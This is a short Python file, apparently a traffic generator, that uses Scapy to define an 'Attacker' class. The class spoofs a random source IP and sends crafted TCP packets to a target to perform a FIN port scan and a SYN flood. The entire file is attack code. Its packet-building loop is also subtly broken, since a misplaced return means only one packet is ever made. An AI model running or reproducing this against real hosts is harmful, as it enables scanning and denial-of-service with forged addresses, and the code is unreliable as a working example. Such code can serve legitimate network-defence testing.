from scapy.all import *
from random import randint


class Attacker:
	def __init__(self, dst_ip, n_pkt, interface):
		self.source_ip = self.generate_ipv4()
		self.destination_ip = dst_ip
		self.packets_to_send = n_pkt
		self.interface = interface

	def generate_ipv4(self):
		return ".".join(map(str, (randint(0, 255) for _ in range(4))))

	def fin_port_scan(self):
		fin_packets = self.craft_packets('F')

		print("Sending {} TCP packets with the FIN flag set to simulate a FIN port scanning...".format(self.packets_to_send))
		for pkt in fin_packets:
			send(pkt, iface=self.interface, verbose=0)

	def syn_flood_attack(self):
		syn_packets = self.craft_packets('S')

		print("Sending {} TCP packets with the SYN flag set to simulate a SYN Flood attack...".format(self.packets_to_send))
		for pkt in syn_packets:
			send(pkt, iface=self.interface, verbose=0)


	def craft_packets(self, flags):
		list_of_packets = []
		# Crafting the packets to be sent
		ip_packet = IP()
		ip_packet.src = self.source_ip
		ip_packet.dst = self.destination_ip

		for i in range(self.packets_to_send):
			source_port = randint(3000, 10000)
			destination_port = randint(1, 65535)
			random_seq = randint(1, 1000)
			random_win_size = randint(500, 2000)

			tcp_segment = TCP()
			tcp_segment.sport = source_port
			tcp_segment.dport = destination_port
			tcp_segment.flags = flags
			tcp_segment.seq = random_seq
			tcp_segment.window = random_win_size

			list_of_packets.append(ip_packet / tcp_segment)

			return list_of_packets

	def run_attacks(self):
		pass

